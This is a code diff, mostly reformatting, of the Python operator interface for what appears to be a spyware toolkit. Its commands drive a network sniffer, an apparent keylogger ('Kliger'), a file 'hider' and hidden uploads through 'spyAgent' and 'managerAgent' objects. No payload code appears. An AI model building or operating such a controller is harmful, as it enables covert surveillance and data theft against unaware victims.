@@ -24,6 +24,7 @@ $ sniff 30
 def LOG(s: str):
     print(f"LOG: {s}")
 
+
 def print_res_str(res: tuple[Responce, bytes]):
     if not res:
         return
@@ -286,7 +287,7 @@ class UI:
         net_driver = self.ctx.selected_operation.netDriver
         params = ContParams(SnifferType, Params(SniffParams(time, net_driver.encode())))
         res = self.ctx.selected_operation.spyAgent.runContraption(
-                params, self.ctx.cont_ident
+            params, self.ctx.cont_ident
         )
         print_res_str(res)
         self.ctx.cont_ident += 1
@@ -312,12 +313,12 @@ class UI:
         kligP = ContParams(KligerType, kligPar)
         ic(kligP)
         res = self.ctx.selected_operation.spyAgent.runContraption(
-                kligP, self.ctx.cont_ident
-            )
+            kligP, self.ctx.cont_ident
+        )
         print_res_str(res)
         self.ctx.cont_ident += 1
 
-    def setup(self, targetPath, imagePath='', mountPath=''):
+    def setup(self, targetPath, imagePath="", mountPath=""):
         """
         USAGE: setup <targetPath> <imagePath> <mountPath>
         Set hider path and other params in manager and spyware (if exists)
@@ -329,15 +330,15 @@ class UI:
         if not self.is_op_active():
             return
         res = self.ctx.selected_operation.managerAgent.hider_setup(
-                targetPath, imagePath, mountPath
-            )
+            targetPath, imagePath, mountPath
+        )
         print_res_str(res)
         # LOG(f"Manager hider set")
         # LOG(f"Manager mount set")
         spy = self.ctx.selected_operation.spyAgent
         if not spy:
             return
-        res = spy.hider_setup(targetPath, imagePath, mountPath)
+        res = spy.hider_setup(spyBasePath + targetPath, imagePath, mountPath)
         print_res_str(res)
         LOG(f"Set Hider/s")
         # LOG(f"Spyware mount set")
@@ -502,10 +503,10 @@ class UI:
         """
         if self.check_ready():
             res = self.ctx.selected_operation.managerAgent.hidden_action_with_upload(
-                    FunCode.HIDDEN_UPLOAD,
-                    homePath,
-                    targetPath,
-                )
+                FunCode.HIDDEN_UPLOAD,
+                homePath,
+                targetPath,
+            )
             print_res_str(res)
             return res
 
